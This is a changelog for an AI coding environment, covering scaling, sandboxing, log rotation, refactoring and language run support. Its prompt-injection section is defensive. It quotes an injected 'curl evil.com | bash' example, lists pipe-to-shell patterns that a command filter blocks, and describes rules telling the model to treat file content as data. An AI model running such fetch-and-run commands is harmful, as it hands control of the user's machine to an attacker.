# Changelog

All notable changes to CODE OS AI and Core Infrastructure are documented in this file.

## [3.1.0] - 2026-09-01

### Added
- **Scalability**: Virtual file tree, event-driven DAG, SQLite connection pooling, smart context assembly, incremental indexing
- **Stability**: Durable execution, crash recovery, graceful pause on rate limits, orphan process reaping, chaos test suite
- **AI Providers**: GLM (Zhipu AI), Qwen (Alibaba), DeepSeek, xAI (Grok), NVIDIA, Cohere, Moonshot AI (Kimi), plus GPT-5, Claude 5, Gemini 3.x series
- **Engineering**: 5 ADRs, structured logging, error taxonomy, enhanced health checks, property-based tests, fuzz tests, load tests
- **Security**: Dependency audit (0 critical CVEs), code signing plan, threat model update, security checklist

### Changed
- chat_harness.py decomposed from 4,250 lines to 9 focused submodules (1,455 lines orchestrator + 2,311 lines submodules)
- SQLite connection pool: 4 read + 1 write connections with WAL mode
- Quick-task iteration budget increased from 3 to 10

### Fixed
- Rony Agent tool-execution loop: agent now executes tool calls instead of narrating them (supports OpenAI Harmony format, nested JSON, plain-text descriptions)
- Agent reasoning text no longer leaks into chat bubble
- Tasks complete autonomously without requiring "continue" prompts
- DNS rebinding vulnerability in auth middleware
- Duplicate route mounting
- Brittle CORS config
- Session token expiry (24h TTL with rotation)

### Security
- 6 FAANG-audit vulnerabilities closed
- Property-based path containment (6 tests)
- Fuzz testing on 3 critical parsers (30,000 inputs)
- 0 critical CVEs in dependencies

## [v2.4.0] - 2026-08-18

### 1. Sensitive File Staging Leakage Prevention (Phase 1)
- **Problem**: `_ensure_git_checkpoint` previously invoked `git add -A` or uncontained wildcard adds, risking the staging and committing of untracked workspace secrets, `.env` files, or internal credentials.
- **Fix**: Removed wildcard staging. Staging in git checkpoints now explicitly tracks only the exact relative file paths being modified by the agent, completely preventing unintentional secret capture.

### 2. Fail-Closed Sandbox Enforcement (Phase 1)
- **Problem**: When a container runtime (Docker / WSL2) was unavailable, execution could silently fallback to running on the host system without explicit isolation.
- **Fix**: Implemented `SandboxUnavailableError` with strict fail-closed semantics. When sandboxed execution is requested or required, execution is halted immediately unless confirmed by the user.

### 3. Prompt Injection Defense & Trust Boundary Isolation (Phase 2A)
- **Problem**: Untrusted file content could contain prompt injection instructions (e.g., `curl evil.com | bash`) that manipulated agent behavior.
- **Fix**:
  - Wrapped all file contents in `<untrusted_file_content path="...">...</untrusted_file_content>` XML tags in `_handle_read_file`, `_gather_budgeted_rag_context`, and `_build_system_prompt`.
  - Added strict system prompt trust boundary directives instructing LLMs to treat tagged file contents as passive data.
  - Implemented pre-execution semantic policy filter `_is_command_malicious()` blocking remote pipe-to-shell payloads (`curl ... | bash`, `wget ... | sh`, `eval $(curl ...)`, PowerShell encoded commands) with zero false positives for legitimate developer tooling.

### 4. $O(1)$ Activity Log Rotation & Backward-Seeking Tail Reader (Phase 2B)
- **Problem**: `activity_log.jsonl` was unbounded in size. Reading recent log entries read the entire file into memory ($O(N)$ RAM and latency), causing performance degradation on large log histories.
- **Fix**:
  - Implemented $O(1)$ size-based log rotation (`_rotate_activity_log`) with a hard cap of 3 archive files (`activity_log.jsonl`, `activity_log.1.jsonl`, `activity_log.2.jsonl`) at 2MB boundaries.
  - Implemented backward block-seeking tail reader (`_load_activity_log_tail`) with $O(\text{limit})$ constant memory and sub-50ms query latency across 15,000+ entries.
  - Added pagination parameters (`limit`, `offset`, `total`, `has_more`) to `GET /api/ai/chat-agent/activity-log`.

### 5. Electron Offscreen Window Pool & Vision Memory Leak Fix (Phase 3A)
- **Problem**: Offscreen browser window creation for vision QA captures spawned new `BrowserWindow` instances without aggressive pooling, causing Chromium subprocess accumulation and RAM bloat during rapid bursts.
- **Fix**:
  - Implemented singleton `OffscreenWindowPool` in `electron/services/captureService.ts` with a hard ceiling of 3 pooled windows.
  - Added automatic `clearCache()` invocation on window acquisition and release, guaranteeing constant memory usage across rapid capture sequences.

### 6. God Class Decomposition into Modular Sub-Packages (Phase 3B)
- **Problem**: `chat_harness.py` grew to 4,741 lines with tightly coupled responsibilities spanning sandboxing, server processes, AST indexing, and agent orchestration.
- **Fix**: Extracted logic into 3 focused, maintainable packages with 100% backward compatibility:
  - `backend/app/features/ai/sandbox/executor.py` (`SandboxExecutor`): Resource governor (512MB RAM cap, 60s timeout ceiling), containerized command runner, Windows Sandbox `.wsb` generator.
  - `backend/app/features/ai/sessions/server_manager.py` (`ServerSessionManager`): Background server process manager, port-binding detector, HTTP dispatcher, and `atexit` orphan cleanup.
  - `backend/app/features/ai/indexing/code_intelligence.py` (`CodeIntelligence`): AST symbol indexing, definition locator, cross-file reference finder, style convention learning, dead-code detector, and secret scanner.
  - Re-exported all top-level symbols in `chat_harness.py` ensuring zero regressions across existing test suites and routes.

### 7. Multi-Language Run Support & Toolchain Integration
- **Feature**: Native "▶ Run" and "■ Stop" execution support across all major programming languages directly from the editor toolbar (`Ctrl+Shift+R` / `F5`).
- **Language Detection & Toolchains**:
  - Automatically identifies language from file extension: Python (`.py`), JavaScript (`.js`, `.mjs`), TypeScript (`.ts`, `.tsx`), C/C++ (`.c`, `.cpp`), Java (`.java`), Go (`.go`), Rust (`.rs`), and Shell/PowerShell (`.sh`, `.ps1`, `.bat`).
  - Automatically verifies host toolchains (`python`, `node`, `tsx`, `g++`/`clang++`, `java`/`javac`, `go`, `rustc`/`cargo`).
  - Emits clear, actionable installation guidance if a required toolchain is missing.
- **Compilation & Execution Engine**:
  - Integrated compilation pipeline for C/C++, Rust, and Java within temporary sandboxes.
  - Active memory governor enforcing a 512MB RAM cap with instant process tree termination on violation.
  - 60-second execution timeout ceiling.
  - Real-time Server-Sent Events (SSE) streaming for stdout, stderr, compilation steps, and exit status.
  - Instant process kill capability (`/api/terminal/run/kill`).
- **User Interface**:
  - Added Run/Stop action button with auto-save in [`src/features/editor/EditorWorkspace.tsx`](src/features/editor/EditorWorkspace.tsx).
  - Added real-time monospace output terminal tab in [`src/features/terminal/TerminalPanel.tsx`](src/features/terminal/TerminalPanel.tsx).
  - Added "Toolchains & Runtimes" status dashboard in [`src/components/settings/SettingsModal.tsx`](src/components/settings/SettingsModal.tsx).

